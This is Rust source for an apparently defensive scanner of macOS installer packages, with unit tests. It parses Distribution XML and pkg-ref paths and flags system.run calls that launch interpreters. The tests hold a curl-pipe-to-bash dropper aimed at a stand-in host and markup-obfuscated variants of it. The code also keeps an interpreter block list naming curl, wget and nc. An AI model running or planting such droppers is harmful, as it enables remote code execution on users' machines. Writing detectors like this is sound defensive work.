            // Bytes we hold but could not parse are still evidence: scan what
            // the walker got, the raw text, and the raw text entity-decoded
            // (each once), then report the entry unreadable.
            let mut all = pieces;
            let lossy = String::from_utf8_lossy(text).into_owned();
            let entity_decoded = xml::decode_entities(text);
            let mut extras = vec![lossy, entity_decoded];
            if text.contains(&0) {
                // ASCII-range UTF-16 behind an 8-bit declaration reads as text
                // once NULs are dropped, at either byte order and alignment.
                let stripped: Vec<u8> = text.iter().copied().filter(|c| *c != 0).collect();
                extras.push(String::from_utf8_lossy(&stripped).into_owned());
                extras.push(xml::decode_entities(&stripped));
            }
            for extra in extras {
                if !all.contains(&extra) {
                    all.push(extra);
                }
            }
            scan_distribution_text(label, join_pieces(&all), findings);
            Err(RuleOutcome::NotApplicable)
        }
    }
}

/// Entries named by `<pkg-ref>#path</pkg-ref>` elements, in document order,
/// distinct, at most `query.max`. Only `#`-prefixed values name an archive
/// member; the `#` is stripped and the rest percent-decoded. With a clear
/// `<choices-outline>`, only references Installer can run are kept (see
/// [`Wiring`]); otherwise all are.
///
/// `None` (trust no reference) if any reference could resolve differently in
/// Installer: CDATA inside it, child elements beside non-blank text (or a
/// `script` or [`Wiring`] element), non-ASCII or control
/// characters, a non-plain path (empty, `.` or `..` segment), or a `%` escape
/// for a byte of 0x80 or above, `/` or NUL.
fn pkg_ref_paths(text: &[u8], query: &RefQuery) -> Option<Vec<usize>> {
    let mut named: Vec<(Option<String>, usize)> = Vec::new();
    let mut wiring = Wiring::default();
    let mut scanner = xml::Scanner::new(text);
    let mut open: Option<(&[u8], Option<String>)> = None;
    let mut content = Vec::new();
    // Elements open inside the current `pkg-ref`, and whether it had any.
    let mut inner: Vec<&str> = Vec::new();
    let mut child = false;
    loop {
        let event = match scanner.next_event() {
            xml::Next::Event(event) => event,
            xml::Next::End if open.is_none() => break,
            xml::Next::End | xml::Next::Bad => return None,
        };
        match (event, &open) {
            (
                xml::Event::Open {
                    name: "pkg-ref",
                    attrs,
                    self_closing: false,
                },
                None,
            ) => {
                let id = wiring.pkg_ref(attrs);
                open = Some((scanner.rest(), id));
                content.clear();
                child = false;
            }
            // Skipped as `distribution_pieces` skips it: raw text, not markup.
            (
                xml::Event::Open {
                    name: "script",
                    self_closing: false,
                    ..
                },
                None,
            ) => {
                // libxml2 parses a script body as markup; NAV does not.
                let body = scanner.raw_until_close("script")?;
                wiring.unclear |= has_wiring_tag(body);
            }
            // Metadata children (`<bundle-version>`) are fine; a script or
            // anything the wiring reads is not.
            (
                xml::Event::Open {
                    name, self_closing, ..
                },
                Some(_),
            ) => {
                if Wiring::is_wiring(name) || local_name(name).eq_ignore_ascii_case("script") {
                    return None;
                }
                child = true;
                if !self_closing {
                    inner.push(name);
                }
            }
            (
                xml::Event::Open {
                    name,
                    attrs,
                    self_closing,
                },
                None,
            ) => wiring.open(name, attrs, self_closing),
            (xml::Event::Text(t), Some(_)) => content.extend_from_slice(t),
            (xml::Event::Close { name }, Some(_)) if !inner.is_empty() => {
                if inner.pop() != Some(name) {
                    return None;
                }
            }
            (xml::Event::Close { name: "pkg-ref" }, Some((start, _))) => {
                // A path split by markup could read differently in Installer.
                if child && !content.iter().all(u8::is_ascii_whitespace) {
                    return None;
                }
                let span = start.get(..start.len().checked_sub(scanner.rest().len())?)?;
                if xml::find(span, b"<![CDATA[").is_some() {
                    return None;
                }
                let (_, id) = open.take()?;
                if let Some(path) = ref_path(&content)? {
                    if let Some(j) = (query.resolve)(&path) {
                        named.push((id, j));
                    }
                }
            }
            (xml::Event::Close { .. }, Some(_)) => return None,
            (xml::Event::Close { name }, None) => wiring.close(name),
            _ => {}
        }
    }
    wiring.unclear |= has_declaration(text);
    // Installer resolves an id to one path; which one, for a repeat, is unmeasured.
    let mut path_of: HashMap<&str, usize> = HashMap::new();
    for (id, j) in &named {
        if let Some(id) = id {
            wiring.unclear |= *path_of.entry(id.as_str()).or_insert(*j) != *j;
        }
    }
    let runs = wiring.runnable();
    let mut seen = HashSet::new();
    let found = named
        .into_iter()
        .filter(|(id, _)| {
            runs.as_ref().map_or(true, |ids| {
                id.as_ref().is_some_and(|i| ids.contains(i.as_str()))
            })
        })
        .map(|(_, j)| j)
        .filter(|j| seen.insert(*j))
        .take(query.max)
        .collect();
    Some(found)
}

/// Which `pkg-ref` ids a `Distribution`'s choices can install: those a
/// `<choice>` holds whose id a `<line>` in `<choices-outline>` names (§5.2).
/// Ids compare ASCII case-folded.
#[derive(Default)]
struct Wiring<'a> {
    /// Open element names outside any `pkg-ref`.
    names: Vec<&'a str>,
    outline_depth: usize,
    /// Ids of the open `<choice>` elements.
    choices: Vec<Option<String>>,
    outline: bool,
    lines: bool,
    reachable: HashSet<String>,
    /// `(choice id, pkg-ref id)` for each `pkg-ref` inside a `<choice>`.
    choice_refs: Vec<(String, String)>,
    /// Structure NAV might read differently from Installer: keep every ref.
    unclear: bool,
}

impl<'a> Wiring<'a> {
    const NAMES: [&'static str; 4] = ["choices-outline", "line", "choice", "pkg-ref"];

    /// Whether `name`, in any case or with a prefix, is one the wiring reads.
    fn is_wiring(name: &str) -> bool {
        let local = local_name(name);
        Self::NAMES.iter().any(|n| n.eq_ignore_ascii_case(local))
    }

    fn open(&mut self, name: &'a str, attrs: &[u8], self_closing: bool) {
        if Self::is_wiring(name) && !Self::NAMES.contains(&name) {
            self.unclear = true;
        }
        let mut choice = None;
        match name {
            "choices-outline" if self.names.len() == 1 => self.outline = true,
            "choices-outline" => self.unclear = true,
            "line" if self.outline_depth > 0 => {
                self.lines = true;
                if let Some(c) = self.id(attrs, "choice") {
                    self.reachable.insert(c);
                }
            }
            "choice" => {
                self.unclear |= !self.choices.is_empty();
                choice = Some(self.id(attrs, "id"));
            }
            "pkg-ref" => {
                self.pkg_ref(attrs);
            }
            _ => {}
        }
        if !self_closing {
            self.names.push(name);
            self.outline_depth += usize::from(name == "choices-outline");
            if let Some(c) = choice {
                self.choices.push(c);
            }
        }
    }

    fn close(&mut self, name: &str) {
        match self.names.pop() {
            Some(n) if n == name => {}
            _ => self.unclear = true,
        }
        match name {
            "choices-outline" => self.outline_depth = self.outline_depth.saturating_sub(1),
            "choice" => {
                self.choices.pop();
            }
            _ => {}
        }
    }

    /// Records a `pkg-ref` and returns its id.
    fn pkg_ref(&mut self, attrs: &[u8]) -> Option<String> {
        let id = self.id(attrs, "id");
        match (self.choices.last(), &id) {
            (Some(Some(c)), Some(i)) => self.choice_refs.push((c.clone(), i.clone())),
            (Some(_), _) => self.unclear = true,
            (None, _) => {}
        }
        id
    }

    /// The `want` attribute, case-folded, when it is plain ASCII with no
    /// entity or space; anything else (a repeat, another case, an odd value)
    /// is unclear.
    fn id(&mut self, attrs: &[u8], want: &str) -> Option<String> {
        let mut out = None;
        for (name, value) in xml::attrs(attrs) {
            let name = String::from_utf8_lossy(name);
            if !local_name(&name).eq_ignore_ascii_case(want) {
                continue;
            }
            let plain =
                !value.is_empty() && value.iter().all(|b| b.is_ascii_graphic() && *b != b'&');
            if name != want || out.is_some() || !plain {
                self.unclear = true;
                return None;
            }
            out = Some(String::from_utf8_lossy(value).to_ascii_lowercase());
        }
        out
    }

    /// The runnable `pkg-ref` ids, or `None` to keep every reference.
    fn runnable(&self) -> Option<HashSet<&str>> {
        if !self.outline || !self.lines || self.unclear || !self.names.is_empty() {
            return None;
        }
        Some(
            self.choice_refs
                .iter()
                .filter(|(c, _)| self.reachable.contains(c))
                .map(|(_, id)| id.as_str())
                .collect(),
        )
    }
}

/// Whether `raw` holds something shaped like a tag the wiring reads.
fn has_wiring_tag(raw: &[u8]) -> bool {
    raw.split(|b| *b == b'<').skip(1).any(|tail| {
        let end = tail
            .iter()
            .position(|b| !(b.is_ascii_alphanumeric() || matches!(b, b':' | b'-' | b'_' | b'.')))
            .unwrap_or(tail.len());
        std::str::from_utf8(tail.get(..end).unwrap_or(&[])).is_ok_and(Wiring::is_wiring)
    })
}

/// `name` without a namespace prefix.
fn local_name(name: &str) -> &str {
    name.rsplit(':').next().unwrap_or(name)
}

/// Whether `text` has a `<!` declaration outside comments and CDATA (a
/// DOCTYPE's attribute defaults could add an id or choice NAV never sees).
fn has_declaration(text: &[u8]) -> bool {
    let mut rest = text;
    while let Some(i) = xml::find(rest, b"<!") {
        let here = rest.get(i..).unwrap_or(&[]);
        let closer: &[u8] = if here.starts_with(b"<!--") {
            b"-->"
        } else if here.starts_with(b"<![CDATA[") {
            b"]]>"
        } else {
            return true;
        };
        match xml::find(here.get(4..).unwrap_or(&[]), closer) {
            Some(end) => rest = here.get(4 + end + closer.len()..).unwrap_or(&[]),
            None => return false,
        }
    }
    false
}

/// The archive path named by one `pkg-ref`'s text: `Some(None)` if it names
/// nothing in the archive, `None` if it is ambiguous (see [`pkg_ref_paths`]).
fn ref_path(content: &[u8]) -> Option<Option<String>> {
    if !content.is_ascii() {
        return None;
    }
    let decoded = xml::decode_entities(content);
    let odd_control = |b: u8| b.is_ascii_control() && !b.is_ascii_whitespace();
    // A `&` not from `&amp;` is an entity libxml2 may expand and we didn't.
    let unexpanded = || {
        let rest = String::from_utf8_lossy(content).replace("&amp;", "");
        xml::decode_entities(rest.as_bytes()).contains('&')
    };
    if !decoded.is_ascii() || decoded.bytes().any(odd_control) || unexpanded() {
        return None;
    }
    let value = decoded.trim_matches(|c: char| c.is_ascii_whitespace());
    let Some(raw) = value.strip_prefix('#') else {
        return Some(None);
    };
    let path = percent_decode(raw)?;
    let plain = !path.bytes().any(|b| b.is_ascii_control())
        && path.split('/').all(|seg| !matches!(seg, "" | "." | ".."));
    plain.then_some(Some(path))
}

/// Decodes `%XX` escapes. `None` for a malformed escape (unmeasured in
/// Installer) or one that decodes to a byte of 0x80 or above, `/` or NUL.
fn percent_decode(s: &str) -> Option<String> {
    let b = s.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    while let Some(&c) = b.get(i) {
        let hex = |k: usize| b.get(k).and_then(|d| (*d as char).to_digit(16));
        match (c, hex(i + 1), hex(i + 2)) {
            (b'%', Some(hi), Some(lo)) => {
                let v = u8::try_from(hi * 16 + lo).ok()?;
                if v >= 0x80 || v == b'/' || v == 0 {
                    return None;
                }
                out.push(v);
                i += 3;
            }
            (b'%', _, _) => return None,
            _ => {
                out.push(c);
                i += 1;
            }
        }
    }
    String::from_utf8(out).ok()
}

/// Records the interpreter launch and content-rule findings in `js`.
fn scan_distribution_text(label: String, js: Vec<u8>, findings: &mut ScriptFindings) {
    if js.is_empty() {
        return;
    }
    if let Some(name) = launched_interpreter(&String::from_utf8_lossy(&js)) {
        findings.add(
            DISTRIBUTION_INTERPRETER_WEIGHT,
            format!("distribution script: system.run launches an interpreter ({name})"),
        );
    }
    findings.scan(label, js, "distribution script", false);
}

/// Shells and script interpreters that `system.run` should not be launching
/// directly from a Distribution (matched on basename).
const INTERPRETERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "ksh",
    "csh",
    "tcsh",
    "dash",
    "osascript",
    "python",
    "python3",
    "perl",
    "ruby",
    "php",
    "curl",
    "env",
    "osacompile",
    "wget",
    "nc",
];

/// Basename of the first `system.run(` / `system.runOnce(` call in `js` whose
/// first argument is a string literal (`'`, `"` or `` ` `` quoted) naming an
/// interpreter: a listed name, optionally followed only by digits and dots
/// (`python3.11`). Whitespace around the dot, paren and literal is ignored;
/// non-literal first arguments never match.
fn launched_interpreter(js: &str) -> Option<String> {
    for (at, _) in js.match_indices("system") {
        let rest = js.get(at + "system".len()..)?;
        let Some(rest) = rest.trim_start().strip_prefix('.') else {
            continue;
        };
        let Some(rest) = rest.trim_start().strip_prefix("run") else {
            continue;
        };
        let rest = rest.strip_prefix("Once").unwrap_or(rest);
        let Some(rest) = rest.trim_start().strip_prefix('(') else {
            continue;
        };
        let rest = rest.trim_start();
        let Some(quote) = rest
            .chars()
            .next()
            .filter(|c| matches!(c, '"' | '\'' | '`'))
        else {
            continue;
        };
        let body = rest.get(1..).unwrap_or("");
        let Some(end) = body.find(quote) else {
            continue;
        };
        let literal = body.get(..end).unwrap_or("").trim();
        let base = literal.rsplit('/').next().unwrap_or(literal);
        let is_interpreter = INTERPRETERS.iter().any(|name| {
            base.strip_prefix(name)
                .is_some_and(|v| v.chars().all(|c| c.is_ascii_digit() || c == '.'))
        });
        if is_interpreter {
            return Some(base.to_string());
        }
    }
    None
}

/// Notes an installer package that carries no signature.
pub struct UnsignedPackageRule;

impl Rule for UnsignedPackageRule {
    fn id(&self) -> &'static str {
        "unsigned-installer-package"
    }

    fn category(&self) -> SignalCategory {
        SignalCategory::ProvenanceConcern
    }

    fn evaluate(&self, ctx: &ScanContext) -> Result<Option<MatchedSignal>, RuleOutcome> {
        let content = ctx.content.as_ref().ok_or(RuleOutcome::NotApplicable)?;

        let Some(archive) = xar::parse(content, &xar::XarLimits::default()) else {
            return Ok(None); // not a package
        };
        if !archive.is_complete() {
            return Err(RuleOutcome::NotApplicable);
        }
        let source_len = ctx.file_len.unwrap_or(content.len() as u64);
        if archive.has_plausible_signature(source_len) {
            // Present but not verified — validity is a Security.framework
            // question (§5.2). A bogus claim counts as unsigned.
            return Ok(None);
        }
        // With a truncated embedded capture `source_len` is only what was
        // captured, so a range past it may still be real (§10/§11.8).
        if !ctx.source_len_is_authoritative()
            && archive.signature_end().is_some_and(|end| end > source_len)
        {
            return Err(RuleOutcome::NotApplicable);
        }

        Ok(Some(MatchedSignal {
            id: self.id().to_string(),
            weight: UNSIGNED_PACKAGE_WEIGHT,
            description: "installer package carries no signature".to_string(),
            category: self.category(),
        }))
    }

    /// Same as `InstallerScriptRule`: nothing to miss if it isn't a xar archive.
    fn covers_truncation(&self, ctx: &ScanContext) -> bool {
        ctx.content
            .as_deref()
            .is_some_and(|c| !xar::has_xar_magic(c))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::context::{ContentSource, ScanContext};
    use crate::test_support::utf16;
    use std::path::PathBuf;

    macro_rules! pkg {
        ($name:literal) => {
            include_bytes!(concat!("../../testdata/xar/", $name, ".pkg")).as_slice()
        };
    }

    fn ctx(name: &str, body: &[u8]) -> ScanContext {
        ScanContext {
            path: PathBuf::from(name),
            content: Some(body.to_vec()),
            file_len: Some(body.len() as u64),
            ..Default::default()
        }
    }

    #[test]
    fn a_malicious_preinstall_is_found_through_the_container() {
        let c = ctx("suspicious.pkg", pkg!("suspicious"));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("rule should evaluate")
            .expect("should fire on a curl-pipe-to-shell preinstall");

        assert_eq!(signal.id, "installer-script-suspicious");
        assert_eq!(signal.category, SignalCategory::StaticSuspicion);
        assert!(signal.weight > 0 && signal.weight <= MAX_SCRIPT_WEIGHT);
        // The description names the script member (§5.5).
        assert!(
            signal.description.contains("preinstall"),
            "{}",
            signal.description
        );
        assert!(
            signal.description.contains("curl"),
            "{}",
            signal.description
        );
    }

    /// An ordinary package must score nothing here (§1) — the reason the rule
    /// reuses the content rules rather than flagging "has scripts".
    #[test]
    fn an_ordinary_package_with_scripts_scores_nothing() {
        let c = ctx("benign.pkg", pkg!("benign"));
        assert!(
            matches!(InstallerScriptRule.evaluate(&c), Ok(None)),
            "a package whose postinstall just touches a file must not score"
        );
    }

    #[test]
    fn a_package_without_scripts_scores_nothing() {
        let c = ctx("noscripts.pkg", pkg!("noscripts"));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    /// A nested package's scripts still run at install time.
    #[test]
    fn scripts_inside_a_nested_package_are_reached() {
        let c = ctx("product.pkg", pkg!("product"));
        // product.pkg wraps the benign package, whose scripts are clean.
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    fn js(xml: &str) -> Result<String, RuleOutcome> {
        distribution_js(xml.as_bytes()).map(|v| String::from_utf8(v).unwrap())
    }

    #[test]
    fn distribution_script_body_is_extracted() {
        let out = js("<a><script>\n system.run('x');\n</script></a>").unwrap();
        assert!(out.contains("system.run('x');"), "{out}");
    }

    #[test]
    fn distribution_script_cdata_is_unwrapped() {
        let out = js("<a><script><![CDATA[ if (a < b && c) { go(); } ]]></script></a>").unwrap();
        assert_eq!(out.trim(), "if (a < b && c) { go(); }");
    }

    #[test]
    fn distribution_script_with_raw_angle_bracket_is_extracted() {
        let out = js("<a><script>if (a < b) { go(); }</script></a>").unwrap();
        assert_eq!(out, "if (a < b) { go(); }");
    }

    #[test]
    fn distribution_script_entities_are_decoded() {
        let out = js("<a><script>if (a &lt; b &amp;&amp; c) go();</script></a>").unwrap();
        assert_eq!(out, "if (a < b && c) go();");
    }

    #[test]
    fn distribution_attribute_expressions_are_extracted_and_decoded() {
        let out = js(
            r#"<c selected="system.compareVersions(v, '10.9') &lt; 1" title="Not JS" onConclusionScript="done()"/>"#,
        )
        .unwrap();
        assert_eq!(out, "system.compareVersions(v, '10.9') < 1\nNot JS\ndone()");
    }

    const DROPPER: &str =
        r#"system.run("/bin/bash","-c","curl -fsSL https://example-cdn.invalid/a.sh | bash")"#;

    #[test]
    fn a_close_tag_inside_cdata_does_not_hide_the_rest_of_the_script() {
        let out = js(&format!(
            r#"<a><script><![CDATA[ var s = "</script>"; {DROPPER}; ]]></script></a>"#
        ))
        .unwrap();
        assert!(out.contains(DROPPER), "{out}");
    }

    #[test]
    fn markup_inside_a_script_body_is_joined_as_a_parser_would() {
        let cdata = js(r#"<a><script>system.run("/bin/ba<![CDATA[sh]]>", "-c", "x")</script></a>"#)
            .unwrap();
        assert!(cdata.contains(r#"system.run("/bin/bash""#), "{cdata}");
        let comment = js("<a><script>cu<!-- x -->rl http://x | bash</script></a>").unwrap();
        assert!(comment.contains("curl http://x | bash"), "{comment}");
        let pi = js("<a><script>cu<?pi x?>rl</script></a>").unwrap();
        assert!(pi.contains("curl"), "{pi}");
    }

    #[test]
    fn a_child_element_variant_is_scanned_as_well() {
        let out = js("<a><script>cu<b/>rl http://x | bash</script></a>").unwrap();
        assert!(out.contains("curl http://x | bash"), "{out}");
        assert!(out.contains("cu<b/>rl"), "{out}");
    }

    #[test]
    fn a_commented_out_script_extracts_nothing() {
        let out = js("<a><script><!-- system.run('/bin/bash') --></script></a>").unwrap();
        assert_eq!(out, "");
    }

    #[test]
    fn every_attribute_value_is_extracted() {
        let out = js(r#"<pkg-ref active="system.run('/bin/bash')"/>"#).unwrap();
        assert!(out.contains("system.run('/bin/bash')"), "{out}");
    }

    fn not_applicable(doc: &[u8]) -> bool {
        matches!(distribution_js(doc), Err(RuleOutcome::NotApplicable))
    }

    #[test]
    fn a_distribution_not_starting_with_markup_is_not_applicable() {
        assert!(not_applicable(b"\x1f\x8b\x08 compressed <a/>"));
        assert!(not_applicable(b"BZh91AY&SY<a/>"));
        assert!(distribution_js(b"\xEF\xBB\xBF \n<a/>").is_ok());
    }

    #[test]
    fn an_unsupported_declared_encoding_is_not_applicable() {
        for decl in ["utf-8", "US-ASCII", "ISO-8859-1", "Latin1"] {
            let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
            assert!(distribution_js(doc.as_bytes()).is_ok(), "{decl}");
        }
        for decl in [
            "UTF-7",
            "Shift_JIS",
            "EBCDIC-US",
            "x-mac-roman",
            "UTF-16",
            "utf-16le",
            "UTF-16BE",
        ] {
            let doc = format!(r#"<?xml version="1.0" encoding="{decl}"?><a/>"#);
            assert!(not_applicable(doc.as_bytes()), "{decl}");
        }
        assert!(not_applicable(b"<?xml version='1.0' encoding=?><a/>"));
    }

    #[test]
    fn dtd_entities_are_not_applicable() {
        let doc =
            br#"<!DOCTYPE d [<!ENTITY p "system.run('/bin/bash')">]><a><script>&p;</script></a>"#;
        assert!(not_applicable(doc));
        // A reference to an entity declared elsewhere (external DTD).
        assert!(not_applicable(b"<a><script>&p;</script></a>"));
        assert!(not_applicable(br#"<a b="&p;"/>"#));
    }

    #[test]
    fn predefined_numeric_and_bare_ampersands_are_fine() {
        let out = js("<a><script>if (a &amp;&amp; b &lt; c &#38; d &#x26; e &quot; &apos; &gt;) x(a && b);</script></a>").unwrap();
        assert!(out.contains("a && b < c"), "{out}");
        assert!(js("<a><script>x = a & b; y = '&' + ';';</script></a>").is_ok());
        // Inside CDATA nothing is an entity reference.
        assert!(js("<a><script><![CDATA[ &p; ]]></script></a>").is_ok());
    }

    #[test]
    fn unterminated_distribution_script_is_not_applicable() {
        assert!(matches!(
            js("<a><script>system.run('x');"),
            Err(RuleOutcome::NotApplicable)
        ));
        assert!(matches!(js("<a><script"), Err(RuleOutcome::NotApplicable)));
    }

    #[test]
    fn distribution_without_js_extracts_nothing() {
        assert_eq!(js("<a><title>T</title><script/><choice/></a>").unwrap(), "");
        assert_eq!(js("<a><script>  \n </script></a>").unwrap(), "");
    }

    #[test]
    fn a_distribution_dropper_is_found_through_the_container() {
        let c = ctx("dropper.pkg", pkg!("distribution_dropper"));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("rule should evaluate")
            .expect("should fire on a curl-pipe-to-shell in Distribution JS");
        assert_eq!(signal.id, "installer-script-suspicious");
        assert!(
            signal.description.starts_with("distribution script:"),
            "{}",
            signal.description
        );
    }

    /// `unload.sh` and `compareVersions` are what real packages ship (§1).
    #[test]
    fn an_ordinary_distribution_script_scores_nothing() {
        let c = ctx("ordinary.pkg", pkg!("distribution_ordinary"));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    #[test]
    fn interpreter_launch_forms_match() {
        for (js, want) in [
            (r#"system.run("/bin/bash", "-c", "x")"#, "bash"),
            ("system.run('/bin/sh', '-c', 'x')", "sh"),
            ("system.run(  \"/usr/bin/osascript\" )", "osascript"),
            ("system.runOnce('/usr/bin/python3', 'x.py')", "python3"),
            ("system.run('bash', '-c', 'x')", "bash"),
            ("system.run(\"/usr/bin/env\", \"curl\")", "env"),
            (
                "a(); system.run('unload.sh'); system.run('/usr/bin/perl')",
                "perl",
            ),
        ] {
            assert_eq!(launched_interpreter(js).as_deref(), Some(want), "{js}");
        }
    }

    #[test]
    fn interpreter_literal_variants_match() {
        for (js, want) in [
            ("system.run(`/bin/bash`, '-c', 'x')", "bash"),
            ("system . run ('/bin/bash')", "bash"),
            ("system\n.\trunOnce  (\"/bin/zsh\")", "zsh"),
            ("system.run('/bin/sh ')", "sh"),
            ("system.run(' /bin/sh')", "sh"),
            ("system.run('/usr/bin/python3.11', 'x')", "python3.11"),
            ("system.run('python2.7')", "python2.7"),
            ("system.run('/opt/bin/perl5.34')", "perl5.34"),
            ("system.run('ruby3.2')", "ruby3.2"),
            ("system.run('/usr/bin/osacompile')", "osacompile"),
            ("system.run('/usr/bin/wget')", "wget"),
            ("system.run('/usr/bin/nc')", "nc"),
        ] {
            assert_eq!(launched_interpreter(js).as_deref(), Some(want), "{js}");
        }
    }

    #[test]
    fn near_miss_names_do_not_match() {
        for js in [
            "system.run('pythonista')",
            "system.run('bash-wrapper')",
            "system.run('/usr/bin/open')",
            "system.run('python3.x')",
            "system.run('nco')",
            "system.run(`${cmd}`)",
            "mysystem.run",
            "system.run('unload.sh')",
        ] {
            assert_eq!(launched_interpreter(js), None, "{js}");
        }
    }

    #[test]
    fn non_interpreter_launches_do_not_match() {
        for js in [
            "system.run('unload.sh')",
            "system.run('./bash_helper')",
            "system.run('/Applications/Foo.app/bash-wrapper')",
            "system.run(cmd, '-c', 'x')",
            "system.run(\"/bin/bash",
            "system.running('/bin/bash')",
            "system.run",
            "system.log('/bin/bash')",
            "",
        ] {
            assert_eq!(launched_interpreter(js), None, "{js}");
        }
    }

    fn marker_count(c: &ScanContext) -> usize {
        match InstallerScriptRule.evaluate(c) {
            Ok(Some(s)) => s.description.matches("launches an interpreter").count(),
            _ => 0,
        }
    }

    #[test]
    fn the_interpreter_marker_counts_once_per_distribution() {
        let c = ctx("dropper.pkg", pkg!("distribution_dropper"));
        assert_eq!(marker_count(&c), 1);
        let signal = InstallerScriptRule.evaluate(&c).unwrap().unwrap();
        assert!(
            signal
                .description
                .contains("distribution script: system.run launches an interpreter (bash)"),
            "{}",
            signal.description
        );
        // The marker plus the content-rule hit exceed the cap.
        assert_eq!(signal.weight, MAX_SCRIPT_WEIGHT);
    }

    #[test]
    fn an_ordinary_distribution_has_no_interpreter_marker() {
        let c = ctx("ordinary.pkg", pkg!("distribution_ordinary"));
        assert_eq!(marker_count(&c), 0);
    }

    #[test]
    fn a_shell_launch_alone_stays_below_notify_weight() {
        let c = ctx("shell.pkg", pkg!("distribution_shell_launch"));
        let signal = InstallerScriptRule.evaluate(&c).unwrap().unwrap();
        assert_eq!(signal.weight, DISTRIBUTION_INTERPRETER_WEIGHT);
        assert_eq!(
            signal.description,
            "distribution script: system.run launches an interpreter (sh)"
        );
    }

    #[test]
    fn a_distribution_with_no_element_is_not_applicable() {
        for blob in [
            b"".as_slice(),
            b"BZh91AY&SY\x01\x02\x03\x04 junk",
            b"plain text, no markup",
        ] {
            assert!(
                matches!(distribution_js(blob), Err(RuleOutcome::NotApplicable)),
                "{blob:?}"
            );
        }
    }

    #[test]
    fn utf16_distributions_are_transcoded() {
        let xml = r#"<a><script>system.run("/bin/bash", "-c", "x");</script></a>"#;
        for (be, bom) in [(false, true), (true, true), (false, false)] {
            let out = distribution_js(&utf16(xml, be, bom)).expect("readable");
            let out = String::from_utf8(out).unwrap();
            assert!(
                out.contains(r#"system.run("/bin/bash""#),
                "be={be} bom={bom}: {out}"
            );
        }
    }

    /// A xar whose only entry is a `Distribution` holding `blob`, with the
    /// given heap `encoding style`.
    fn distribution_pkg(style: &str, blob: &[u8]) -> Vec<u8> {
        let toc = format!(
            r#"<file id="1"><name>Distribution</name><type>file</type><data><offset>0</offset><length>{n}</length><size>{n}</size><encoding style="{style}"/></data></file>"#,
            n = blob.len()
        );
        let mut bytes = xar::toc_xar_bytes(&toc);
        bytes.extend_from_slice(blob);
        bytes
    }

    fn bzip2_distribution_pkg(blob: &[u8]) -> Vec<u8> {
        distribution_pkg("application/x-bzip2", blob)
    }

    /// Real bzip2 (`testdata/bzip2/distribution_dropper.in`) of a dropper Distribution.
    #[test]
    fn a_bzip2_distribution_in_a_package_is_checked() {
        let blob = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
        let c = ctx("bz.pkg", &bzip2_distribution_pkg(blob));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded Distribution scores");
        assert!(
            signal.description.starts_with("distribution script:"),
            "{}",
            signal.description
        );
        assert!(!c.marked_incomplete("installer-script-suspicious"));
    }

    /// A bzip2 `Distribution` missing its trailer still reads in libxar, so
    /// Installer runs it. The decoded part is scanned and the gap reported.
    #[test]
    fn a_trailerless_bzip2_dropper_distribution_scores_and_marks_incomplete() {
        let full = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
        let cut = crate::bzip2::cut_trailer(full);
        assert!(cut.len() < full.len());
        let bytes = bzip2_distribution_pkg(cut);

        let c = ctx("cut.pkg", &bytes);
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
            .expect("the decoded part scores");
        assert!(
            signal.description.starts_with("distribution script:"),
            "{}",
            signal.description
        );
        assert!(c.marked_incomplete("installer-script-suspicious"));

        let c = ctx("cut.pkg", &bytes);
        let rules: Vec<Box<dyn Rule>> = vec![Box::new(InstallerScriptRule)];
        let r = crate::scan::scan_context(&c, &rules);
        assert_eq!(r.completeness, crate::model::ScanCompleteness::Partial);
        assert_eq!(r.signals.len(), 1);
    }

    /// Same cut, nothing found: unreadable, never clean.
    #[test]
    fn a_trailerless_bzip2_benign_distribution_is_not_applicable() {
        let full = include_bytes!("../../testdata/bzip2/distribution_ordinary.in");
        let cut = crate::bzip2::cut_trailer(full);
        let c = ctx("cut.pkg", &bzip2_distribution_pkg(cut));
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        // Intact, it is clean.
        let c = ctx("ok.pkg", &bzip2_distribution_pkg(full));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    fn zlib_distribution_pkg(blob: &[u8]) -> Vec<u8> {
        distribution_pkg("application/x-gzip", blob)
    }

    /// A zlib `Distribution` missing its Adler-32 still extracts in libxar:
    /// the decoded text is scanned and the gap reported (#75).
    #[test]
    fn a_trailerless_zlib_dropper_distribution_scores_and_marks_incomplete() {
        let full = include_bytes!("../../testdata/inflate/zlib_distribution_dropper.in");
        assert_scored_but_partial(&zlib_distribution_pkg(&full[..full.len() - 4]));
        assert_scored_but_partial(&zlib_distribution_pkg(&full[..full.len() - 2]));
    }

    /// Cut mid-stream, with the dropper still inside the decoded prefix.
    #[test]
    fn a_zlib_distribution_cut_mid_stream_scores_the_decoded_prefix() {
        let full = include_bytes!("../../testdata/inflate/zlib_distribution_padded.in");
        assert_scored_but_partial(&zlib_distribution_pkg(&full[..full.len() / 2]));
    }

    #[test]
    fn a_trailerless_zlib_benign_distribution_is_not_applicable() {
        let full = include_bytes!("../../testdata/inflate/zlib_distribution_ordinary.in");
        let c = ctx("cut.pkg", &zlib_distribution_pkg(&full[..full.len() - 4]));
        assert!(matches!(
            InstallerScriptRule.evaluate(&c),
            Err(RuleOutcome::NotApplicable)
        ));
        // Intact, it is clean.
        let c = ctx("ok.pkg", &zlib_distribution_pkg(full));
        assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
    }

    /// A stored gzip-wrapped cpio `Scripts` missing its gzip trailer: the
    /// decoded members are scanned and the gap reported (#75).
    #[test]
    fn a_trailerless_gzip_scripts_entry_scores_and_marks_incomplete() {
        let full = include_bytes!("../../testdata/gzip/scripts_dropper.in");
        let c = ctx("s.pkg", &pkg_with_scripts(&full[..full.len() - 8]));
        let signal = InstallerScriptRule
            .evaluate(&c)
            .expect("evaluates")
